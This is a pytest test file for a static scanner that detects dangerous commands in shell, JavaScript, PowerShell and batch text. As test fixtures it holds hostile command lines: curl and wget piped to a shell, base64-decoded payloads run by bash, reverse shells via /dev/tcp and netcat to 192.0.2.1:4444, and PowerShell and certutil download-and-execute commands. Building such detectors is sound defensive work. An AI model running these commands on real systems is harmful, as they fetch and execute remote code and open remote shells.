import pytest

from app.scanners.static import rules
from app.scanners.static.text_scan import MAX_HITS_PER_FILE, scan_text


@pytest.mark.parametrize(
    ("language", "text", "rule"),
    [
        ("shell", "curl -s https://x.example/i | sh", rules.TEXT_PIPE_TO_SHELL),
        ("shell", "wget -qO- https://x.example | sudo bash", rules.TEXT_PIPE_TO_SHELL),
        ("shell", "echo aGk= | base64 -d | sh", rules.TEXT_PIPE_TO_SHELL),
        ("shell", "base64 --decode p.txt | bash", rules.TEXT_PIPE_TO_SHELL),
        ("shell", "bash -i >& /dev/tcp/192.0.2.1/4444 0>&1", rules.TEXT_REVERSE_SHELL),
        ("shell", "nc 192.0.2.1 4444 -e /bin/sh", rules.TEXT_REVERSE_SHELL),
        ("javascript", "const c = require('child_process')", rules.TEXT_JS_CHILD_PROCESS),
        ("javascript", 'import { exec } from "node:child_process"', rules.TEXT_JS_CHILD_PROCESS),
        ("javascript", "eval(payload)", rules.TEXT_JS_EVAL),
        ("javascript", "const f = new Function(body)", rules.TEXT_JS_EVAL),
        ("powershell", "powershell -enc SQBFAFgAIAAoAE4AZQB3AA==", rules.TEXT_PS_ENCODED),
        ("powershell", "Invoke-Expression $x", rules.TEXT_PS_DOWNLOAD_EXEC),
        (
            "powershell",
            "(New-Object Net.WebClient).DownloadString($u)",
            rules.TEXT_PS_DOWNLOAD_EXEC,
        ),
        ("batch", "certutil -urlcache -f http://x a.exe", rules.TEXT_BATCH_DOWNLOAD),
        ("batch", "bitsadmin /create j /transfer x", rules.TEXT_BATCH_DOWNLOAD),
        ("python_unparsed", "os.system('x'", rules.TEXT_PY_FALLBACK),
    ],
)
def test_rules_match(language, text, rule):
    hits = scan_text(text, language)
    assert hits[0].rule == rule and hits[0].line == 1


@pytest.mark.parametrize(
    ("language", "text"),
    [
        ("shell", "curl -o file.tgz https://x.example/a"),
        ("shell", "echo hello | grep h"),
        ("javascript", "model.eval(x)"),
        ("javascript", "const retrieval = medieval(1)"),
        ("powershell", "Write-Host hello"),
        ("batch", "echo done"),
        ("python_unparsed", "model.eval("),
    ],
)
def test_benign_text_is_not_flagged(language, text):
    assert scan_text(text, language) == []


def test_line_numbers():
    assert scan_text("echo a\necho b\ncurl x | sh\n", "shell")[0].line == 3


def test_hits_per_file_are_capped():
    assert len(scan_text("curl x | sh\n" * 5000, "shell")) == MAX_HITS_PER_FILE


def test_symbol_is_bounded():
    hit = scan_text("curl " + "a" * 900 + " | sh", "shell")[0]
    assert len(hit.symbol) <= 120
